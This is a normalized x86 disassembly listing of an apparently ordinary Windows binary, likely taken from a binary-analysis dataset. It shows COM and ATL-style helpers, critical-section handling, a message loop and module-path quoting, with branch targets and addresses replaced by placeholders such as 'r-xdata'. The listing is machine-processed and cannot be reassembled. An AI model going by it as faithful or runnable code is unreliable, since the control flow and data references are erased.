test edi edi
js r-xdata
xor eax eax
pop edi
retn
mov eax [ esi + 0x8 ]
cmp edi eax
jge r-xdata
lea ecx [ eax - 0x1 ]
cmp edi ecx
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi ]
mov edi [ _recalloc@IAT ]
push 0x4
dec eax
push eax
push ecx
call edi
add esp 0xc
test eax eax
jne r-xdata
mov edx [ esi ]
sub eax edi
add eax eax
add eax eax
lea ecx [ edx + edi * 4 ]
lea edx [ eax - 0x4 ]
push edx
lea edx [ ecx + 0x4 ]
push edx
push eax
push ecx
call sub_402530
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
sub eax edi
add eax eax
add eax eax
lea edx [ eax - 0x4 ]
push edx
lea ecx [ ecx + edi * 4 ]
lea edx [ ecx + 0x4 ]
push edx
push eax
push ecx
call sub_402530
add esp 0x20
mov [ esi ] eax
cmp [ esi + 0x8 ] 0x1
jne r-xdata
mov [ esi + 0x4 ] eax
cmp [ esi + 0x8 ] 0x1
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ esi + 0x4 ]
push 0x4
dec edx
push edx
push eax
call edi
add esp 0xc
test eax eax
jne r-xdata
dec [ esi + 0x8 ]
mov eax 0x1
pop edi
retn
sub_40ee70
push ebp
mov ebp esp
push 0xffffffff
push sub_447fba
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ rw-data ]
add edi 0x10
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
push edi
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x10 ] 0x1
call [ GetCurrentThreadId@IAT ]
mov ebx [ rw-data ]
mov ecx [ ebx + 0x8 ]
mov esi eax
xor eax eax
test ecx ecx
jle r-xdata
xor esi esi
jmp r-xdata
mov edx [ ebx ]
push edi
call [ LeaveCriticalSection@IAT ]
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0xffffffff
jne r-xdata
inc eax
add edx 0x4
cmp eax ecx
jl r-xdata
mov esi ebx
call sub_40edc0
mov esi eax
cmp [ edx ] esi
je r-xdata
xor esi esi
jmp r-xdata
sub_40ef20
push esi
push edi
mov edi ecx
xor esi esi
cmp [ edi + 0x14 ] esi
jle r-xdata
pop edi
xor eax eax
pop esi
retn 0x4
jmp r-xdata
test esi esi
js r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp esi [ edi + 0x14 ]
jge r-xdata
mov eax [ edi + 0x10 ]
mov ecx [ eax + esi * 4 ]
test ecx ecx
je r-xdata
inc esi
cmp esi [ edi + 0x14 ]
jl r-xdata
mov edx [ ecx ]
mov eax [ edx ]
call eax
sub_40ef70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi [ edi + 0x8 ]
dec esi
js r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp esi [ edi + 0x8 ]
jge r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ eax + esi * 4 ]
test ecx ecx
je r-xdata
dec esi
jns r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push ebx
call eax
test eax eax
jne r-xdata
test esi esi
js r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
pop ebp
retn 0x4
sub_40efd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
lea esi [ edi + 0x1c ]
push 0x0
push 0x0
push 0x0
push esi
call [ GetMessageW@IAT ]
cmp eax 0xffffffff
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call [ PeekMessageW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
push ebx
mov ecx edi
call edx
inc ebx
test eax eax
jne r-xdata
mov eax [ edi + 0x24 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi ]
mov edx [ eax ]
push esi
mov ecx edi
call edx
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x20 ]
cmp eax 0x118
ja r-xdata
push esi
call [ TranslateMessage@IAT ]
push esi
call [ DispatchMessageW@IAT ]
cmp eax 0x200
je r-xdata
jmp r-xdata
cmp eax 0xf
je r-xdata
xor ebx ebx
mov [ ebp - 0x4 ] 0x1
cmp eax 0xa0
jmp r-xdata
je r-xdata
sub_40f070
push ebp
mov ebp esp
push 0xffffffff
push sub_446e7a
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ rw-data ]
add edi 0x10
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x1
push edi
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x14 ] 0x1
call [ GetCurrentThreadId@IAT ]
mov esi [ rw-data ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x10 ]
push ecx
call sub_40fac0
push edi
mov esi eax
call [ LeaveCriticalSection@IAT ]
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40f100
push ebp
mov ebp esp
push 0xffffffff
push sub_446e42
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x4 ] 0x0
lea edi [ esi + 0x4 ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push edi
call sub_403d20
mov [ esi + 0xc ] 0x0
add esi 0x10
push esi
call [ DeleteCriticalSection@IAT ]
mov [ edi ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_40f190
push esi
xor esi esi
push esi
push ecx
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov eax esi
call [ GetLastError@IAT ]
test eax eax
jle r-xdata
pop esi
retn
and eax 0xffff
or eax 0x80070000
pop esi
retn
sub_40f1c0
push esi
xor esi esi
xor eax eax
push esi
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] rw-data
mov [ rw-data ] esi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x24
mov eax rw-data
pop esi
retn
call [ GetLastError@IAT ]
cmp eax esi
jle r-xdata
jge r-xdata
and eax 0xffff
or eax 0x80070000
cmp eax esi
mov [ rw-data ] 0x1
mov eax rw-data
pop esi
retn
sub_40f250
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
push edi
lea edi [ esi + 0x4 ]
je r-xdata
pop edi
pop esi
retn
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push edi
call sub_403d20
mov [ esi + 0xc ] 0x0
add esi 0x10
push esi
call [ DeleteCriticalSection@IAT ]
mov [ edi ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_40f2a0
push ebp
mov ebp esp
push 0xffffffff
push sub_446e08
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x4 ] 0x0
lea edi [ esi + 0x4 ]
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push edi
call sub_403d20
mov [ esi + 0xc ] 0x0
add esi 0x10
push esi
call [ DeleteCriticalSection@IAT ]
mov [ edi ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_40f320
push ebp
mov ebp esp
push 0xffffffff
push sub_447f82
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi + 0x4 ] 0x0
lea edi [ esi + 0x4 ]
je r-xdata
test [ ebp + 0x8 ] 0x1
je r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push edi
call sub_403d20
mov [ esi + 0xc ] 0x0
lea eax [ esi + 0x10 ]
push eax
call [ DeleteCriticalSection@IAT ]
mov [ edi ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_40f3f0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
push edi
xor edi edi
cmp [ ecx + 0x28 ] edi
lea esi [ ecx + 0x28 ]
jne r-xdata
mov eax 0x80004003
pop ebx
pop ebp
retn 0x4
mov eax [ esi ]
mov [ ebx ] eax
mov esi [ esi ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
push esi
call edx
push esi
push r--data
push 0x1
push edi
push r--data
call [ CoCreateInstance@IAT ]
mov edi eax
test edi edi
js r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_40f480
push ebp
mov ebp esp
push 0xffffffff
push sub_44a92f
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
lea eax [ ebp - 0xa54 ]
mov ebx ecx
mov esi edx
mov [ ebp - 0xa58 ] r--data
mov [ ebp - 0xa44 ] eax
mov [ ebp - 0xa54 ] edi
mov [ ebp - 0xa50 ] edi
mov [ ebp - 0xa4c ] edi
mov [ ebp - 0x4 ] 0x2
cmp esi edi
je r-xdata
mov edx [ ebx ]
mov edx [ edx + 0x14 ]
lea eax [ ebp - 0xa58 ]
push eax
mov ecx ebx
call edx
mov esi eax
cmp esi edi
jge r-xdata
mov eax [ esi ]
cmp eax edi
je r-xdata
mov [ ebp - 0xa44 ] edi
mov [ ebp - 0x4 ] 0x4
mov esi [ rw-data ]
push 0x104
lea eax [ ebp - 0x218 ]
push eax
push esi
call [ GetModuleFileNameW@IAT ]
cmp eax edi
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa58 ]
call sub_40f9c0
mov eax esi
jmp r-xdata
lea ecx [ ecx ]
cmp eax 0x104
jne r-xdata
call sub_409b60
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0x8 ]
add esi 0x8
cmp eax edi
jne r-xdata
cmp ecx edi
je r-xdata
lea eax [ ebp - 0x218 ]
mov edx 0x208
lea ecx [ ebp - 0xa40 ]
call sub_40fa50
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0x2
lea esi [ ebp - 0xa44 ]
call sub_409b30
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa58 ]
call sub_40f9c0
mov eax 0x8007007a
jmp r-xdata
mov edi eax
mov [ ebp - 0x4 ] 0x2
lea esi [ ebp - 0xa44 ]
call sub_409b30
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa58 ]
call sub_40f9c0
mov eax edi
mov ecx [ esi + 0x4 ]
cmp eax edi
je r-xdata
mov [ ebp - 0xa44 ] edi
mov [ ebp - 0x4 ] 0x3
push ecx
push eax
lea ecx [ ebp - 0xa54 ]
push ecx
call sub_40fb80
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x62e ]
mov eax 0x22
push 0x20b
push ecx
lea esi [ ebp - 0xa40 ]
mov [ ebp - 0x630 ] ax
call sub_408690
add esp 0x8
test al al
jne r-xdata
push edi
call [ GetModuleHandleW@IAT ]
cmp esi eax
je r-xdata
lea edx [ ebp - 0x630 ]
push edx
call [ lstrlenW@IAT ]
mov ecx 0x22
xor edx edx
mov [ ebp + eax * 2 - 0x630 ] cx
mov [ ebp + eax * 2 - 0x62e ] dx
lea eax [ ebp - 0x630 ]
push eax
push r--data
lea ecx [ ebp - 0xa58 ]
push ecx
mov [ ebp - 0x4 ] 0x2
lea esi [ ebp - 0xa44 ]
call sub_409b30
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa58 ]
call sub_40f9c0
mov eax 0x80004005
jmp r-xdata
lea ecx [ ebp - 0xa40 ]
push ecx
push r--data
lea edx [ ebp - 0xa58 ]
push edx
jmp r-xdata
lea edx [ ebp - 0xa40 ]
push edx
push r--data
lea eax [ ebp - 0xa58 ]
push eax
call sub_40fd30
mov ebx eax
cmp ebx edi
jl r-xdata
mov [ ebp - 0x4 ] 0x2
lea esi [ ebp - 0xa44 ]
call sub_409b30
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa58 ]
call sub_40f9c0
mov eax ebx
jmp r-xdata
call sub_40fd30
mov ebx eax
cmp ebx edi
jge r-xdata
mov [ ebp - 0xa5c ] edi
cmp [ ebp + 0xc ] edi
je r-xdata
mov [ ebp - 0x4 ] 0x6
push edi
push r--data
lea eax [ ebp - 0x218 ]
push eax
mov [ ebp - 0x4 ] 0x5
push 0x1
push r--data
lea edx [ ebp - 0x218 ]
push edx
jmp r-xdata
movzx ecx [ ebp + 0x8 ]
lea edx [ ebp - 0xa58 ]
call sub_411c90
mov [ ebp - 0x4 ] 0x4
sub_40f790
push ebp
mov ebp esp
push 0xffffffff
push sub_447f55
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x4 ]
call sub_40f910
or ebx 0xffffffff
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
call sub_40f910
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
mov ebx [ free@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call ebx
add esp 0x4
mov [ esi ] 0x0
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x8 ] 0x0
je r-xdata
push eax
call ebx
add esp 0x4
mov [ esi + 0x4 ] 0x0
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push edi
call [ operator delete@IAT ]
add esp 0x4
sub_40f850
mov eax [ esi ]
push edi
mov edi [ free@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x8 ] 0x0
pop edi
retn
push eax
call edi
add esp 0x4
mov [ esi + 0x4 ] 0x0
sub_40f890
push ebp
mov ebp esp
push 0xffffffff
push sub_4462d8
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x4 ] edi
call sub_40f910
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ebx [ free@IAT ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push eax
call ebx
add esp 0x4
mov [ esi ] edi
mov [ esi + 0x8 ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call ebx
add esp 0x4
mov [ esi + 0x4 ] edi
sub_40f910
push edi
xor edi edi
cmp [ esi + 0x8 ] edi
jle r-xdata
mov eax [ esi ]
mov edi [ free@IAT ]
test eax eax
je r-xdata
push ebx
mov ebx [ `placement delete closure'@IAT ]
nop
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
add esp 0x4
mov [ esi ] 0x0
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp edi [ esi + 0x8 ]
jge r-xdata
mov [ esi + 0x8 ] 0x0
xor eax eax
pop edi
retn
push eax
call edi
add esp 0x4
mov [ esi + 0x4 ] 0x0
mov eax [ esi ]
mov ecx [ eax + edi * 4 ]
push ecx
call ebx
add esp 0x4
cmp edi [ esi + 0x8 ]
jge r-xdata
mov edx [ esi + 0x4 ]
mov eax [ edx + edi * 4 ]
push eax
call ebx
inc edi
add esp 0x4
cmp edi [ esi + 0x8 ]
jl r-xdata
test edi edi
js r-xdata
pop ebx
sub_40f9c0
push ebp
mov ebp esp
push 0xffffffff
push sub_447f55
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
xor edi edi
mov [ ebp - 0x4 ] edi
lea esi [ ecx + 0x4 ]
call sub_40f910
or ebx 0xffffffff
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
call sub_40f910
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
mov ebx [ free@IAT ]
cmp eax edi
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push eax
call ebx
add esp 0x4
mov [ esi ] edi
mov [ esi + 0x8 ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call ebx
add esp 0x4
mov [ esi + 0x4 ] edi
sub_40fa50
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
dec edi
je r-xdata
xor edx edx
pop edi
mov [ ecx ] dx
pop esi
retn
jmp r-xdata
movzx edx [ esi ]
test dx dx
je r-xdata
xor eax eax
pop edi
mov [ ecx ] ax
pop esi
retn
mov [ ecx ] dx
add ecx 0x2
cmp [ esi ] 0x27
jne r-xdata
inc eax
add esi 0x2
cmp eax edi
jb r-xdata
inc eax
cmp eax edi
jae r-xdata
mov edx 0x27
mov [ ecx ] dx
add ecx 0x2
sub_40fac0
push ebp
mov ebp esp
push 0xffffffff
push sub_444fda
mov eax [ fs : 0x0 ]
push eax
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ esi + 0x8 ]
mov ecx [ esi ]
mov edi [ _recalloc@IAT ]
push 0x4
inc eax
push eax
push ecx
call edi
add esp 0xc
test eax eax
jne r-xdata
mov edx [ esi + 0x8 ]
push 0x4
inc edx
mov [ esi ] eax
mov eax [ esi + 0x4 ]
push edx
push eax
call edi
add esp 0xc
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
lea ecx [ eax * 4 ]
mov eax [ esi ]
add eax ecx
mov [ ebp - 0x4 ] 0x0
je r-xdata
or edx 0xffffffff
mov [ ebp - 0x4 ] edx
mov eax [ esi + 0x4 ]
add eax ecx
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
mov [ ebp - 0x4 ] edx
inc [ esi + 0x8 ]
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
mov ecx [ ecx ]
mov [ eax ] ecx
sub_40fb80
push ebp
mov ebp esp
push 0xffffffff
push sub_446de0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0xc ]
xor ebx ebx
cmp eax ebx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov [ ebp - 0x20 ] ebx
push eax
call [ lstrlenW@IAT ]
lea esi [ eax + eax + 0x2 ]
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
xor ecx ecx
mov eax esi
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_443fa9
add esp 0x4
mov edi eax
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x18 ] edi
mov eax [ ebp + 0x10 ]
push eax
call [ lstrlenW@IAT ]
lea esi [ eax + eax + 0x2 ]
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] 0x3
xor ecx ecx
mov eax esi
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_443fa9
add esp 0x4
mov ebx eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x24 ] ebx
test edi edi
je r-xdata
mov [ ebp - 0x20 ] 0x8007000e
jmp r-xdata
test ebx ebx
je r-xdata
xor edx edx
cmp [ ebp - 0x20 ] edx
setge dl
mov esi edx
mov [ ebp - 0x4 ] 0x2
push ebx
mov edi [ `placement delete closure'@IAT ]
call edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x18 ]
push eax
call edi
add esp 0x8
mov [ ebp - 0x18 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push edi
mov eax [ ebp - 0x28 ]
mov ecx [ ebp + 0xc ]
mov edx eax
call sub_402480
push ebx
mov eax esi
mov ecx [ ebp + 0x10 ]
mov edx esi
call sub_402480
add esp 0x8
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x14 ]
push ecx
mov esi [ ebp + 0x8 ]
call sub_40fac0
test eax eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x24 ] ebx
sub_40fd30
push ebp
mov ebp esp
push 0xffffffff
push sub_447f18
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
cmp ecx edx
je r-xdata
mov eax 0x80070057
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0x10 ]
cmp eax edx
je r-xdata
mov [ ebp + 0xc ] edx
mov [ ebp - 0x4 ] edx
push eax
mov eax [ ebp + 0x8 ]
push ecx
add eax 0x4
push eax
call sub_40fb80
neg eax
sbb eax eax
and eax 0x7ff8fff2
add eax 0x8007000e
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
sub_40fdc0
push ebp
mov ebp esp
push 0xffffffff
push sub_44a3a8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
cmp ecx eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax 0x80070057
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push 0x1
push r--data
push eax
call sub_411c90
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_40fe40
push ebp
mov ebp esp
push eax
call [ malloc@IAT ]
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
pop ebp
retn 0x4
push 0x8007000e
call sub_402d00
sub_40fe80
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
cmp [ edi + 0x8 ] esi
jle r-xdata
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov ebx [ lstrcmpiW@IAT ]
cmp esi 0xffffffff
jne r-xdata
inc esi
cmp esi [ edi + 0x8 ]
jl r-xdata
test esi esi
js r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ edi ]
mov ecx [ ecx + esi * 4 ]
push eax
push ecx
call ebx
test eax eax
je r-xdata
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp esi [ edi + 0x8 ]
jge r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + esi * 4 ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_40fef0
push ebp
mov ebp esp
push 0xffffffff
push sub_446da8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor eax eax
cmp esi eax
jne r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
push esi
call [ lstrlenW@IAT ]
push esi
mov esi [ ebp + 0x8 ]
mov edi eax
call sub_40ffa0
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40ff70
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mul [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov eax 0x80070216
pop ebp
retn
cmp eax 0xffffffff
jbe r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
xor eax eax
pop ebp
retn
sub_40ffa0
push ebp
mov ebp esp
mov eax [ esi ]
lea ecx [ eax + edi + 0x1 ]
cmp ecx eax
jle r-xdata
xor eax eax
pop ebp
retn 0x4
cmp ecx edi
jle r-xdata
cmp ecx [ esi + 0x4 ]
jl r-xdata
mov ecx [ esi ]
test ecx ecx
js r-xdata
mov edi edi
mov eax [ esi + 0x4 ]
cmp ecx eax
jge r-xdata
add eax eax
mov [ esi + 0x4 ] eax
cmp ecx eax
jge r-xdata
mov edx eax
sub edx ecx
cmp edx eax
jg r-xdata
mov eax [ esi + 0x4 ]
cmp eax 0x3fffffff
jg r-xdata
mov edx [ esi + 0x8 ]
xor ecx ecx
shld ecx eax 0x1
add eax eax
test ecx ecx
ja r-xdata
push ebx
mov ebx [ esi + 0x8 ]
lea ecx [ ebx + ecx * 2 ]
push ecx
mov ecx [ ebp + 0x8 ]
lea eax [ edi + edi ]
add edx edx
call sub_402480
add [ esi ] edi
